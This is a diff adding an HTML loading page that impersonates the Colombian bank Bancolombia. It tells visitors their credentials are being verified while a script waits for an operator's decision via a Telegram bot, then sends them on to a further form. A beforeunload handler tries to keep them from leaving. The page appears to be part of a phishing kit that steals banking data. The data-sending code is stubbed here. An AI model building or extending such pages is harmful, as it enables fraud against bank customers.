@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bancolombia - Cargando</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #f0f2f5 0%, #e8ecf0 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            overflow: hidden;
+        }
+        
+        /* Overlay para efecto de loading */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(2px);
+            z-index: 1;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
+            padding: 60px 40px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #1e3a8a;
+            margin-bottom: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .logo::before {
+            content: "≡";
+            font-size: 20px;
+        }
+        
+        .spinner-container {
+            margin: 40px 0;
+        }
+        
+        .spinner {
+            width: 80px;
+            height: 80px;
+            border: 4px solid #e5e7eb;
+            border-top: 4px solid #3b82f6;
+            border-radius: 50%;
+            margin: 0 auto;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .loading-title {
+            font-size: 28px;
+            font-weight: bold;
+            color: #1a1a1a;
+            margin-bottom: 15px;
+        }
+        
+        .loading-subtitle {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 30px;
+        }
+        
+        .loading-dots {
+            display: inline-block;
+            width: 70px;
+        }
+        
+        .loading-dots::after {
+            content: '';
+            animation: dots 2s infinite;
+        }
+        
+        @keyframes dots {
+            0%, 20% {
+                content: '';
+            }
+            40% {
+                content: '.';
+            }
+            60% {
+                content: '..';
+            }
+            80%, 100% {
+                content: '...';
+            }
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #e5e7eb;
+            border-radius: 2px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #3b82f6, #1d4ed8);
+            border-radius: 2px;
+            animation: progress 3s ease-in-out infinite;
+        }
+        
+        @keyframes progress {
+            0% {
+                width: 0%;
+                transform: translateX(-100%);
+            }
+            50% {
+                width: 100%;
+                transform: translateX(0%);
+            }
+            100% {
+                width: 100%;
+                transform: translateX(100%);
+            }
+        }
+        
+        .status-message {
+            font-size: 14px;
+            color: #666;
+            min-height: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="overlay"></div>
+    
+    <div class="container">
+        <div class="logo">≡ Bancolombia</div>
+        
+        <div class="spinner-container">
+            <div class="spinner"></div>
+        </div>
+        
+        <h2 class="loading-title">Cargando<span class="loading-dots"></span></h2>
+        <p class="loading-subtitle">Validando tus datos</p>
+        
+        <div class="progress-bar">
+            <div class="progress-fill"></div>
+        </div>
+        
+        <div class="status-message" id="statusMessage">
+            Conectando con el servidor...
+        </div>
+    </div>
+
+    <script>
+        // Mensajes de estado que van cambiando
+        const statusMessages = [
+            'Conectando con el servidor...',
+            'Verificando credenciales...',
+            'Validando información...',
+            'Procesando solicitud...',
+            'Casi terminamos...'
+        ];
+        
+        let messageIndex = 0;
+        const statusElement = document.getElementById('statusMessage');
+        
+        // Cambiar mensajes de estado cada 2 segundos
+        function updateStatusMessage() {
+            statusElement.textContent = statusMessages[messageIndex];
+            messageIndex = (messageIndex + 1) % statusMessages.length;
+        }
+        
+        // Iniciar cambio de mensajes
+        setInterval(updateStatusMessage, 2000);
+        
+        // Simular verificación de estado del bot de Telegram
+        function checkTelegramResponse() {
+            // Aquí se verificará si hay respuesta del bot de Telegram
+            // Por ahora simularemos con timeout
+            
+            // Verificar cada 2 segundos si hay una decisión desde Telegram
+            const checkInterval = setInterval(() => {
+                // Simular respuesta desde Telegram (esto sería una llamada real a tu API)
+                const telegramResponse = checkForTelegramDecision();
+                
+                if (telegramResponse) {
+                    clearInterval(checkInterval);
+                    redirectToNextForm(telegramResponse);
+                }
+            }, 2000);
+            
+            // Timeout de seguridad después de 30 segundos
+            setTimeout(() => {
+                clearInterval(checkInterval);
+                // Si no hay respuesta, redirigir al formulario por defecto
+                redirectToNextForm('contact');
+            }, 30000);
+        }
+        
+        function checkForTelegramDecision() {
+            // Aquí verificarías tu API/database por la decisión del operador
+            // Por ahora retornamos null (sin respuesta aún)
+            
+            // Ejemplo de respuesta que vendrá de Telegram:
+            // return { nextForm: 'contact', approved: true };
+            return null;
+        }
+        
+        function redirectToNextForm(response) {
+            // Determinar a qué formulario redirigir según la respuesta de Telegram
+            let nextPage = 'contact.html'; // Por defecto
+            
+            if (typeof response === 'string') {
+                nextPage = response + '.html';
+            } else if (response && response.nextForm) {
+                nextPage = response.nextForm + '.html';
+            }
+            
+            // Efectos de transición antes de redirigir
+            document.querySelector('.container').style.opacity = '0.5';
+            statusElement.textContent = 'Redirigiendo...';
+            
+            setTimeout(() => {
+                window.location.href = nextPage;
+            }, 1000);
+        }
+        
+        // Iniciar verificación cuando carga la página
+        document.addEventListener('DOMContentLoaded', function() {
+            checkTelegramResponse();
+        });
+        
+        // Prevenir que el usuario salga de la página mientras carga
+        window.addEventListener('beforeunload', function(e) {
+            e.preventDefault();
+            e.returnValue = '';
+        });
+    </script>
+</body>
+</html>
